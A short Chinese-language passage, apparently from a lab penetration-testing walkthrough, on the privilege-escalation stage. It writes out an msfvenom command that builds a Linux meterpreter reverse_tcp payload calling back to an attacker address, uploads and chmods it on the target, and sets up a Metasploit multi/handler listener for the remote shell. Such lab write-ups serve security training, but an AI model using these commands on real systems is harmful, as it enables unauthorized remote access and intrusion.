提权（后面可以不用看了）

下一步的目标是提权，可以先通过现有的shell产生meterpreter会话

msfvenom -p  linux/x86/meterpreter/reverse_tcp LHOST=192.168.14.135 LPORT=6666 -f elf -o escalate.elf

 

将所创建的escalate.elf文件上传到目标主机的tmp目录，并赋予可执行权限

chmod +x escalate.elf

在Kali Linux测启动msfconsole ,并使用exploit/multi/handler启动侦听

use exploit/multi/handler

set payload linux/x86/meterpreter/reverse_tcp

show options

set LHOST 192.168.14.135

set LPORT 6666

run

 

 

这样Kali Linxu与目标主机之间建立了meterpreter会话，此时要保持会话，再打开一个新终端，执行接下来的操作。
